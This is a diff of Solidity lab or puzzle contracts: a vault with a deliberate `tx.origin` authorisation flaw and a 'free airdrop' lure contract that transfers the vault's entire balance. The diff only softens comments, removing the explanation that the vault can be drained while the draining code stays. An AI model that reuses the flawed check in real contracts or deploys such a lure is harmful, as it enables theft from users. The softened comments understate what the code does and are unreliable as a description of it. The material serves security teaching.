@@ -4,8 +4,7 @@ pragma solidity ^0.8.35;
 import {SolvableBase} from "@common/SolvableBase.sol";
 
 /// @notice Personal vault whose `transferTo` checks `tx.origin == owner`
-///         instead of `msg.sender == owner`. Any contract called within
-///         the same tx by the owner can drain the vault.
+///         instead of `msg.sender == owner`.
 contract Q12TxOriginVault {
     address public immutable owner;
 
@@ -25,7 +24,7 @@ contract Q12TxOriginVault {
 }
 
 /// @notice A "free airdrop" lure. Calling its only function looks
-///         harmless, but internally it drains the target vault using
+///         harmless, but internally interacts with the target vault using
 ///         the caller's tx.origin as authorization.
 contract Q12Phisher {
     Q12TxOriginVault public immutable vault;
@@ -33,16 +32,14 @@ contract Q12Phisher {
     bool public airdropClaimed;
 
     /// @param v Target vault.
-    /// @param b Where the drained ETH is forwarded. In a real attack this
-    ///          would be the attacker's address. In this tutorial it points
-    ///          back at the user so they observe their own funds returning.
+    /// @param b Beneficiary used by the lab scenario.
     constructor(Q12TxOriginVault v, address payable b) {
         vault = v;
         beneficiary = b;
     }
 
-    /// @notice The lure. Looks like a freebie; under the hood it pulls
-    ///         the entire vault balance out via the vault's tx.origin check.
+    /// @notice The lure. Looks like a freebie; under the hood it calls into
+    ///         the vault's tx.origin-gated path.
     function claimFreeAirdrop() external {
         airdropClaimed = true;
         vault.transferTo(beneficiary, address(vault).balance);
